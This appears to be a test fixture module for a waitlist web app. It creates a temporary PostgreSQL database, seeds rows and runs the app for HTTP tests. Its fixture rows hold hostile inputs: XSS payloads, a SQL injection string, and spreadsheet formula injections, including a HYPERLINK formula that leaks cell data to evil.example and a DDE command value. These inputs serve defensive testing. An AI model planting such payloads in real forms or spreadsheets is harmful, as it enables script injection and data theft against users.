/**
 * A temporary database with the waitlist table and fixture rows, hostile ones
 * included, and an in-process copy of the app to call over HTTP.
 *
 * UAIN_TEST_PG names a PostgreSQL server the tests may create databases on;
 * by default the local demo cluster (docker container uain-demo-pg).
 */
import { randomBytes } from 'node:crypto';
import { readFile } from 'node:fs/promises';
import http from 'node:http';
import pg from 'pg';
import { createApp } from '../src/app.js';
import { hashPassword } from '../src/auth.js';
import { loadConfig } from '../src/config.js';
import { createDb } from '../src/db.js';

export const ADMIN_URL =
  process.env.UAIN_TEST_PG ||
  'postgres://uain:uain-demo-local@127.0.0.1:55433/postgres';
export const PASSWORD = 'correct horse battery staple 42';
export const SECRET = 'a-test-session-secret-of-more-than-32-bytes';

let cachedHash;
/** The test password's hash, at the lowest cost allowed, to keep tests quick. */
export async function passwordHash() {
  cachedHash ??= await hashPassword(PASSWORD, { N: 16384 });
  return cachedHash;
}

export const BULK = 60;

/** Fixture rows. Hostile values are what anyone may type into the public form. */
export function fixtureRows() {
  const row = (r) => ({
    system_types: '["ai_agent"]',
    description: 'A system that wants to join.',
    contributes: '[]',
    wants: '[]',
    missions: '[]',
    networks: '[]',
    channel: 'web',
    status: 'unverified',
    ...r,
  });
  const rows = [
    row({
      name: 'Kestrel Research Agent',
      system_types: '["ai_agent","multi_agent_system"]',
      url: 'https://kestrel.example.org/about',
      description: 'Literature review and replication.',
      contributes: '["intelligence","compute"]',
      wants: '["capital","collaboration_partners"]',
      goals: 'Find cures faster.',
      missions: '["health","science"]',
      operator: 'Kestrel Labs',
      email: 'kestrel@example.org',
      endpoint: 'https://kestrel.example.org/mcp',
      repository: 'https://github.com/example/kestrel',
      networks: '["ethereum"]',
      wallet: '0x0000000000000000000000000000000000000001',
      referrer: 'moltbook',
      caller: 'c0ffee',
      user_agent: 'Mozilla/5.0 (test)',
      registered_at: '2026-09-01T09:15:00.000Z',
    }),
    row({
      name: '<script>alert(1)</script>',
      system_types: '["<script>alert(6)</script>","ai_agent"]',
      url: 'javascript:alert(4)',
      description: '</textarea><script>alert(3)</script>',
      operator: '"><img src=x onerror=alert(2)>',
      email: 'x@example.org"><script>alert(5)</script>',
      webhook: 'data:text/html,<script>alert(8)</script>',
      goals: "' OR 1=1 --",
      missions: '["<svg onload=alert(9)>"]',
      channel: 'api',
      status: '<script>alert(7)</script>',
      referrer: '<iframe src=//evil.example>',
      user_agent: '<script>alert(10)</script>',
      registered_at: '2026-09-02T12:00:00.000Z',
    }),
    row({
      name: '=HYPERLINK("http://evil.example/?leak="&A1,"Click")',
      operator: "+cmd|' /C calc'!A0",
      description: '-2+3',
      email: '@SUM(1+1)',
      goals: '\t=1+1',
      capabilities: '\r=1+1',
      repository: 'https://example.org/"quoted"',
      channel: 'api',
      registered_at: '2026-09-02T13:00:00.000Z',
    }),
    row({
      name: `O'Brien "Quotes" 100% _under_`,
      description: 'Backslash \\ here, and a comma, and a\nnew line.',
      operator: 'Percent Ltd',
      email: 'obrien@example.org',
      channel: 'api',
      status: 'verified',
      registered_at: '2026-09-03T08:00:00.000Z',
    }),
    row({
      name: 'Broken JSON Bot',
      system_types: 'not json',
      missions: '{"not":"a list"}',
      networks: '[1, {"x": 2}]',
      email: 'broken@example.org',
      registered_at: 'not a date',
    }),
  ];
  for (let i = 1; i <= BULK; i++)
    rows.push(
      row({
        name: `Bulk agent ${String(i).padStart(2, '0')}`,
        system_types:
          i % 2 ? '["foundation_model"]' : '["robotics","ai_infrastructure"]',
        contributes: '["data"]',
        wants: '["compute"]',
        missions: '["energy"]',
        networks: '["solana"]',
        operator: `Operator ${i}`,
        email: `bulk${i}@example.org`,
        registered_at: new Date(
          Date.UTC(2026, 8, 4 + (i % 25), 10, i),
        ).toISOString(),
      }),
    );
  return rows;
}

const COLS = [
  'name',
  'system_types',
  'system_type_other',
  'url',
  'description',
  'contributes',
  'contributes_other',
  'capabilities',
  'wants',
  'wants_other',
  'goals',
  'missions',
  'missions_other',
  'mission_project',
  'operator',
  'email',
  'endpoint',
  'webhook',
  'wallet',
  'repository',
  'networks',
  'referrer',
  'channel',
  'status',
  'caller',
  'user_agent',
  'registered_at',
];

export function dbUrl(name, base = ADMIN_URL) {
  const u = new URL(base);
  u.pathname = `/${name}`;
  return u.toString();
}

export async function adminQuery(sql, params, url = ADMIN_URL) {
  const c = new pg.Client({ connectionString: url });
  await c.connect();
  try {
    return await c.query(sql, params);
  } finally {
    await c.end();
  }
}

/** A new database with the waitlist table, the fixture rows and one table the reader must not see. */
export async function createTempDb() {
  const name = `wl_test_${randomBytes(6).toString('hex')}`;
  await adminQuery(
    `CREATE DATABASE ${name} TEMPLATE template0 ENCODING 'UTF8' LC_COLLATE 'C' LC_CTYPE 'C'`,
  );
  const url = dbUrl(name);
  const c = new pg.Client({ connectionString: url });
  await c.connect();
  try {
    await c.query(
      await readFile(
        new URL('./fixtures/waitlist.sql', import.meta.url),
        'utf8',
      ),
    );
    await c.query(
      `CREATE TABLE participants (id text PRIMARY KEY, secret text NOT NULL)`,
    );
    await c.query(
      `INSERT INTO participants VALUES ('p1', 'never-readable-by-the-dashboard')`,
    );
    for (const r of fixtureRows()) {
      const cols = COLS.filter((k) => r[k] !== undefined);
      await c.query(
        `INSERT INTO waitlist (${cols.join(', ')}) VALUES (${cols.map((_, i) => `$${i + 1}`).join(', ')})`,
        cols.map((k) => r[k]),
      );
    }
  } finally {
    await c.end();
  }
  return {
    name,
    url,
    drop: () => adminQuery(`DROP DATABASE IF EXISTS ${name} WITH (FORCE)`),
  };
}

/** A clock the test moves by hand. */
export function fakeClock(start = Date.parse('2026-09-30T12:00:00Z')) {
  let t = start;
  const now = () => t;
  now.advance = (ms) => {
    t += ms;
  };
  return now;
}

/** The app on a free local port. Production settings unless `env` says otherwise. */
export async function startApp({ databaseUrl, env = {}, now } = {}) {
  const config = loadConfig({
    DATABASE_URL: databaseUrl,
    WAITLIST_ADMIN_PASSWORD_HASH: await passwordHash(),
    WAITLIST_SESSION_SECRET: SECRET,
    ...env,
  });
  const db = config.configured ? createDb(config.databaseUrl) : null;
  const logs = [];
  const server = http.createServer(
    createApp({
      config,
      db,
      log: (e) => logs.push(e),
      ...(now ? { now } : {}),
    }),
  );
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  return {
    base: `http://127.0.0.1:${server.address().port}`,
    config,
    logs,
    async close() {
      server.closeAllConnections();
      await new Promise((resolve) => server.close(resolve));
      await db?.close();
    },
  };
}

/** A browser, more or less: keeps cookies, never follows redirects. */
export class Browser {
  constructor(base, headers = {}) {
    this.base = base;
    this.headers = headers;
    this.jar = new Map();
  }

  async request(path, { method = 'GET', form, headers = {} } = {}) {
    const h = { ...this.headers, ...headers };
    if (this.jar.size)
      h.cookie = [...this.jar].map(([k, v]) => `${k}=${v}`).join('; ');
    if (form) h['content-type'] = 'application/x-www-form-urlencoded';
    const res = await fetch(this.base + path, {
      method,
      redirect: 'manual',
      headers: h,
      ...(form ? { body: new URLSearchParams(form).toString() } : {}),
    });
    const cookies = res.headers.getSetCookie();
    for (const c of cookies) {
      const pair = c.split(';')[0];
      const i = pair.indexOf('=');
      const name = pair.slice(0, i).trim();
      const value = pair.slice(i + 1).trim();
      if (/;\s*max-age=0\b/i.test(c) || !value) this.jar.delete(name);
      else this.jar.set(name, value);
    }
    return {
      status: res.status,
      headers: res.headers,
      cookies,
      text: await res.text(),
    };
  }

  /** The CSRF token in a page's form. */
  static csrf(text) {
    return /name="csrf" value="([^"]+)"/.exec(text)?.[1];
  }

  async login(password = PASSWORD, extra = {}) {
    const page = await this.request('/login');
    return this.request('/login', {
      method: 'POST',
      form: { csrf: Browser.csrf(page.text), password, next: '/', ...extra },
    });
  }
}
